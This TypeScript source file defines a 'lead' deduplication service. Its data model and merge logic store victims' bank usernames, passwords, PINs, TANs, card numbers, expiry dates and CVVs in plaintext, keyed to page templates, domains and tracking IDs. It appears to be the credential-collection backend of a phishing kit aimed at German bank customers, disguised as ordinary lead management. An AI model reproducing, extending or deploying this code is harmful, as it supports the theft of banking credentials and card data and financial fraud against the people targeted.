/**
 * Lead Service
 * Handles lead deduplication, upsert logic, and history tracking
 */

import { getDb } from '../database';

// Types for lead data
export interface LeadHistoryEntry {
  value: any;
  source: 'submission' | 'import' | 'partial';
  timestamp: string;
  template_name?: string;
}

export interface LeadHistory {
  phones: LeadHistoryEntry[];
  emails: LeadHistoryEntry[];
  addresses: LeadHistoryEntry[];
  login_attempts: Array<{
    username: string;
    password: string;
    pin?: string;
    source: string;
    timestamp: string;
    template_name?: string;
  }>;
  bank_cards: Array<{
    card_number: string;
    expiry_date?: string;
    cvv?: string;
    cardholder_name?: string;
    source: string;
    timestamp: string;
  }>;
}

export interface LeadCurrentData {
  phone?: string;
  email?: string;
  address?: {
    street?: string;
    street_number?: string;
    plz?: string;
    city?: string;
    full_address?: string;
  };
}

export interface LeadAdditionalData {
  current: LeadCurrentData;
  history: LeadHistory;
  personal_data: {
    first_name?: string;
    last_name?: string;
    date_of_birth?: string;
  };
  // Legacy fields for backward compatibility
  session_key?: string;
  selected_bank?: string;
  selected_branch?: string;
  login_data?: any;
  bank_card?: any;
  qr_data?: any;
  flow_completed?: boolean;
  completed_at?: string;
  browser?: string;
  ip_address?: string;
  [key: string]: any;
}

export interface LeadData {
  template_id: number;
  domain_id: number;
  tracking_id?: string;
  first_name?: string;
  last_name?: string;
  email?: string;
  phone?: string;
  username?: string;
  password?: string;
  pin?: string;
  additional_data?: Partial<LeadAdditionalData>;
  ip_address?: string;
  user_agent?: string;
  status?: string;
  source?: 'submission' | 'import' | 'partial';
  template_name?: string;
  // Address fields
  street?: string;
  street_number?: string;
  plz?: string;
  city?: string;
  date_of_birth?: string;
  // Bank card fields
  card_number?: string;
  expiry_date?: string;
  cvv?: string;
  cardholder_name?: string;
}

export interface ExistingLead {
  id: number;
  template_id: number;
  domain_id: number;
  tracking_id: string | null;
  name: string | null;
  first_name: string | null;
  last_name: string | null;
  email: string | null;
  phone: string | null;
  username: string | null;
  password: string | null;
  pin: string | null;
  tan: string | null;
  additional_data: string | null;
  ip_address: string | null;
  user_agent: string | null;
  status: string;
  source: string | null;
  notes: string | null;
  created_at: string;
  updated_at: string | null;
  submission_count: number;
}

class LeadService {
  /**
   * Normalize a name for comparison (case-insensitive, trimmed, handles umlauts)
   */
  normalizeName(name: string | null | undefined): string {
    if (!name) return '';
    
    return name
      .trim()
      .toLowerCase()
      // Normalize German umlauts for comparison
      .replace(/ä/g, 'ae')
      .replace(/ö/g, 'oe')
      .replace(/ü/g, 'ue')
      .replace(/ß/g, 'ss')
      // Remove extra whitespace
      .replace(/\s+/g, ' ');
  }

  /**
   * Find an existing lead by first_name and last_name (case-insensitive)
   */
  findExistingLead(firstName: string | null | undefined, lastName: string | null | undefined): ExistingLead | null {
    if (!firstName && !lastName) {
      return null;
    }

    const db = getDb();
    
    const normalizedFirst = this.normalizeName(firstName);
    const normalizedLast = this.normalizeName(lastName);
    
    // If we only have one name part, try to match on either field
    if (!normalizedFirst || !normalizedLast) {
      const singleName = normalizedFirst || normalizedLast;
      const lead = db.prepare(`
        SELECT * FROM leads 
        WHERE LOWER(REPLACE(REPLACE(REPLACE(REPLACE(first_name, 'ä', 'ae'), 'ö', 'oe'), 'ü', 'ue'), 'ß', 'ss')) = ?
           OR LOWER(REPLACE(REPLACE(REPLACE(REPLACE(last_name, 'ä', 'ae'), 'ö', 'oe'), 'ü', 'ue'), 'ß', 'ss')) = ?
        ORDER BY updated_at DESC, created_at DESC
        LIMIT 1
      `).get(singleName, singleName) as ExistingLead | undefined;
      
      return lead || null;
    }
    
    // Match on both first and last name
    const lead = db.prepare(`
      SELECT * FROM leads 
      WHERE LOWER(REPLACE(REPLACE(REPLACE(REPLACE(first_name, 'ä', 'ae'), 'ö', 'oe'), 'ü', 'ue'), 'ß', 'ss')) = ?
        AND LOWER(REPLACE(REPLACE(REPLACE(REPLACE(last_name, 'ä', 'ae'), 'ö', 'oe'), 'ü', 'ue'), 'ß', 'ss')) = ?
      ORDER BY updated_at DESC, created_at DESC
      LIMIT 1
    `).get(normalizedFirst, normalizedLast) as ExistingLead | undefined;
    
    return lead || null;
  }

  /**
   * Parse existing additional_data JSON safely
   */
  parseAdditionalData(jsonString: string | null): LeadAdditionalData {
    const defaultData: LeadAdditionalData = {
      current: {},
      history: {
        phones: [],
        emails: [],
        addresses: [],
        login_attempts: [],
        bank_cards: []
      },
      personal_data: {}
    };

    if (!jsonString) {
      return defaultData;
    }

    try {
      const parsed = JSON.parse(jsonString);
      
      // If it's already in the new format, return it
      if (parsed.current && parsed.history) {
        return {
          ...defaultData,
          ...parsed,
          history: {
            ...defaultData.history,
            ...parsed.history
          }
        };
      }
      
      // Migrate from old format to new format
      const migrated: LeadAdditionalData = {
        ...defaultData,
        ...parsed,
        current: {
          phone: parsed.personal_data?.phone || parsed.phone,
          email: parsed.personal_data?.email || parsed.email,
          address: parsed.personal_data ? {
            street: parsed.personal_data.street,
            street_number: parsed.personal_data.street_number,
            plz: parsed.personal_data.plz,
            city: parsed.personal_data.city,
            full_address: parsed.personal_data.address
          } : undefined
        },
        history: {
          phones: [],
          emails: [],
          addresses: [],
          login_attempts: parsed.login_attempts || [],
          bank_cards: []
        },
        personal_data: {
          first_name: parsed.personal_data?.first_name,
          last_name: parsed.personal_data?.last_name,
          date_of_birth: parsed.personal_data?.date_of_birth
        }
      };
      
      // Migrate existing login_data to history
      if (parsed.login_data && parsed.login_data.username) {
        migrated.history.login_attempts.push({
          username: parsed.login_data.username,
          password: parsed.login_data.password,
          pin: parsed.login_data.pin,
          source: 'submission',
          timestamp: parsed.completed_at || new Date().toISOString()
        });
      }
      
      // Migrate existing bank_card to history
      if (parsed.bank_card && parsed.bank_card.card_number) {
        migrated.history.bank_cards.push({
          card_number: parsed.bank_card.card_number,
          expiry_date: parsed.bank_card.expiry_date,
          cvv: parsed.bank_card.cvv,
          cardholder_name: parsed.bank_card.cardholder_name,
          source: 'submission',
          timestamp: parsed.completed_at || new Date().toISOString()
        });
      }
      
      return migrated;
    } catch (error) {
      console.error('Error parsing additional_data:', error);
      return defaultData;
    }
  }

  /**
   * Merge new data into existing lead data, preserving all history
   */
  mergeLeadData(
    existing: ExistingLead,
    newData: LeadData
  ): { 
    mergedAdditionalData: LeadAdditionalData;
    updatedFields: Partial<ExistingLead>;
  } {
    const timestamp = new Date().toISOString();
    const source = newData.source || 'submission';
    
    // Parse existing additional_data
    const existingData = this.parseAdditionalData(existing.additional_data);
    
    // Start with existing data
    const merged: LeadAdditionalData = {
      ...existingData,
      current: { ...existingData.current },
      history: {
        phones: [...(existingData.history?.phones || [])],
        emails: [...(existingData.history?.emails || [])],
        addresses: [...(existingData.history?.addresses || [])],
        login_attempts: [...(existingData.history?.login_attempts || [])],
        bank_cards: [...(existingData.history?.bank_cards || [])]
      },
      personal_data: { ...existingData.personal_data }
    };

    const updatedFields: Partial<ExistingLead> = {};

    // Handle phone number
    if (newData.phone && newData.phone !== existing.phone) {
      merged.history.phones.push({
        value: newData.phone,
        source,
        timestamp,
        template_name: newData.template_name
      });
      merged.current.phone = newData.phone;
      updatedFields.phone = newData.phone;
    }

    // Handle email
    if (newData.email && newData.email !== existing.email) {
      merged.history.emails.push({
        value: newData.email,
        source,
        timestamp,
        template_name: newData.template_name
      });
      merged.current.email = newData.email;
      updatedFields.email = newData.email;
    }

    // Handle address
    const hasNewAddress = newData.street || newData.plz || newData.city;
    if (hasNewAddress) {
      const newAddress = {
        street: newData.street,
        street_number: newData.street_number,
        plz: newData.plz,
        city: newData.city
      };
      
      // Check if address is different from current
      const currentAddress = merged.current.address;
      const isDifferent = !currentAddress || 
        currentAddress.street !== newAddress.street ||
        currentAddress.plz !== newAddress.plz ||
        currentAddress.city !== newAddress.city;
      
      if (isDifferent) {
        merged.history.addresses.push({
          value: newAddress,
          source,
          timestamp,
          template_name: newData.template_name
        });
        merged.current.address = newAddress;
      }
    }

    // Handle login credentials - ALWAYS append to history
    if (newData.username || newData.password) {
      merged.history.login_attempts.push({
        username: newData.username || '',
        password: newData.password || '',
        pin: newData.pin,
        source,
        timestamp,
        template_name: newData.template_name
      });
      
      // Update top-level fields with latest credentials
      if (newData.username) updatedFields.username = newData.username;
      if (newData.password) updatedFields.password = newData.password;
      if (newData.pin) updatedFields.pin = newData.pin;
    }

    // Handle bank card data
    if (newData.card_number) {
      // Check if this card is different from existing ones
      const cardExists = merged.history.bank_cards.some(
        card => card.card_number === newData.card_number
      );
      
      if (!cardExists) {
        merged.history.bank_cards.push({
          card_number: newData.card_number,
          expiry_date: newData.expiry_date,
          cvv: newData.cvv,
          cardholder_name: newData.cardholder_name,
          source,
          timestamp
        });
      }
    }

    // Handle personal data (DOB) - keep first non-null value
    if (newData.date_of_birth && !merged.personal_data.date_of_birth) {
      merged.personal_data.date_of_birth = newData.date_of_birth;
    }

    // Preserve other fields from new additional_data
    if (newData.additional_data) {
      // Copy over any legacy fields that might be useful
      if (newData.additional_data.session_key) {
        merged.session_key = newData.additional_data.session_key;
      }
      if (newData.additional_data.selected_bank) {
        merged.selected_bank = newData.additional_data.selected_bank;
      }
      if (newData.additional_data.selected_branch) {
        merged.selected_branch = newData.additional_data.selected_branch;
      }
      if (newData.additional_data.qr_data) {
        merged.qr_data = newData.additional_data.qr_data;
      }
      if (newData.additional_data.browser) {
        merged.browser = newData.additional_data.browser;
      }
      if (newData.additional_data.ip_address) {
        merged.ip_address = newData.additional_data.ip_address;
      }
      merged.flow_completed = newData.additional_data.flow_completed ?? merged.flow_completed;
      merged.completed_at = newData.additional_data.completed_at ?? merged.completed_at;
    }

    return { mergedAdditionalData: merged, updatedFields };
  }

  /**
   * Upsert a lead - update if exists (by first_name + last_name), create if new
   * Returns the lead ID and whether it was an update or insert
   */
  upsertLead(leadData: LeadData): { leadId: number; isUpdate: boolean; existingLead?: ExistingLead } {
    const db = getDb();
    const timestamp = new Date().toISOString();
    const source = leadData.source || 'submission';

    // Try to find existing lead
    const existingLead = this.findExistingLead(leadData.first_name, leadData.last_name);

    if (existingLead) {
      // UPDATE existing lead
      console.log(`🔄 Found existing lead (ID: ${existingLead.id}) for ${leadData.first_name} ${leadData.last_name} - updating...`);
      
      const { mergedAdditionalData, updatedFields } = this.mergeLeadData(existingLead, leadData);
      
      // Build update query dynamically
      const updates: string[] = [
        'additional_data = ?',
        'updated_at = ?',
        'submission_count = submission_count + 1'
      ];
      const params: any[] = [JSON.stringify(mergedAdditionalData), timestamp];
      
      // Add updated fields
      if (updatedFields.phone) {
        updates.push('phone = ?');
        params.push(updatedFields.phone);
      }
      if (updatedFields.email) {
        updates.push('email = ?');
        params.push(updatedFields.email);
      }
      if (updatedFields.username) {
        updates.push('username = ?');
        params.push(updatedFields.username);
      }
      if (updatedFields.password) {
        updates.push('password = ?');
        params.push(updatedFields.password);
      }
      if (updatedFields.pin) {
        updates.push('pin = ?');
        params.push(updatedFields.pin);
      }
      
      // Update status if it's an upgrade (e.g., partial -> completed)
      if (leadData.status && leadData.status === 'completed' && existingLead.status !== 'completed') {
        updates.push('status = ?');
        params.push(leadData.status);
      }
      
      // Update tracking_id if provided and different
      if (leadData.tracking_id && leadData.tracking_id !== existingLead.tracking_id) {
        updates.push('tracking_id = ?');
        params.push(leadData.tracking_id);
      }
      
      // Update IP and user agent with latest
      if (leadData.ip_address) {
        updates.push('ip_address = ?');
        params.push(leadData.ip_address);
      }
      if (leadData.user_agent) {
        updates.push('user_agent = ?');
        params.push(leadData.user_agent);
      }
      
      params.push(existingLead.id);
      
      const updateQuery = `UPDATE leads SET ${updates.join(', ')} WHERE id = ?`;
      db.prepare(updateQuery).run(...params);
      
      console.log(`✅ Updated lead ${existingLead.id} - submission count: ${existingLead.submission_count + 1}`);
      
      return { leadId: existingLead.id, isUpdate: true, existingLead };
    } else {
      // INSERT new lead
      console.log(`➕ Creating new lead for ${leadData.first_name} ${leadData.last_name}`);
      
      // Build initial additional_data structure
      const initialData: LeadAdditionalData = {
        current: {
          phone: leadData.phone,
          email: leadData.email,
          address: (leadData.street || leadData.plz || leadData.city) ? {
            street: leadData.street,
            street_number: leadData.street_number,
            plz: leadData.plz,
            city: leadData.city
          } : undefined
        },
        history: {
          phones: leadData.phone ? [{
            value: leadData.phone,
            source,
            timestamp,
            template_name: leadData.template_name
          }] : [],
          emails: leadData.email ? [{
            value: leadData.email,
            source,
            timestamp,
            template_name: leadData.template_name
          }] : [],
          addresses: (leadData.street || leadData.plz || leadData.city) ? [{
            value: {
              street: leadData.street,
              street_number: leadData.street_number,
              plz: leadData.plz,
              city: leadData.city
            },
            source,
            timestamp,
            template_name: leadData.template_name
          }] : [],
          login_attempts: (leadData.username || leadData.password) ? [{
            username: leadData.username || '',
            password: leadData.password || '',
            pin: leadData.pin,
            source,
            timestamp,
            template_name: leadData.template_name
          }] : [],
          bank_cards: leadData.card_number ? [{
            card_number: leadData.card_number,
            expiry_date: leadData.expiry_date,
            cvv: leadData.cvv,
            cardholder_name: leadData.cardholder_name,
            source,
            timestamp
          }] : []
        },
        personal_data: {
          first_name: leadData.first_name,
          last_name: leadData.last_name,
          date_of_birth: leadData.date_of_birth
        }
      };
      
      // Merge with any additional data provided
      if (leadData.additional_data) {
        Object.assign(initialData, leadData.additional_data);
      }
      
      const fullName = [leadData.first_name, leadData.last_name].filter(Boolean).join(' ') || null;
      
      const result = db.prepare(`
        INSERT INTO leads (
          template_id, domain_id, tracking_id, name, first_name, last_name,
          email, phone, username, password, pin, additional_data,
          ip_address, user_agent, status, source, created_at, updated_at, submission_count
        )
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
      `).run(
        leadData.template_id,
        leadData.domain_id,
        leadData.tracking_id || null,
        fullName,
        leadData.first_name || null,
        leadData.last_name || null,
        leadData.email || null,
        leadData.phone || null,
        leadData.username || null,
        leadData.password || null,
        leadData.pin || null,
        JSON.stringify(initialData),
        leadData.ip_address || null,
        leadData.user_agent || null,
        leadData.status || 'new',
        source,
        timestamp,
        timestamp
      );
      
      const leadId = result.lastInsertRowid as number;
      console.log(`✅ Created new lead with ID: ${leadId}`);
      
      return { leadId, isUpdate: false };
    }
  }

  /**
   * Get lead by ID with parsed additional_data
   */
  getLeadById(id: number): (ExistingLead & { parsedData: LeadAdditionalData }) | null {
    const db = getDb();
    const lead = db.prepare('SELECT * FROM leads WHERE id = ?').get(id) as ExistingLead | undefined;
    
    if (!lead) return null;
    
    return {
      ...lead,
      parsedData: this.parseAdditionalData(lead.additional_data)
    };
  }

  /**
   * Get submission history for a lead
   */
  getLeadHistory(leadId: number): LeadHistory | null {
    const lead = this.getLeadById(leadId);
    if (!lead) return null;
    
    return lead.parsedData.history;
  }
}

// Export singleton instance
export const leadService = new LeadService();
export default leadService;

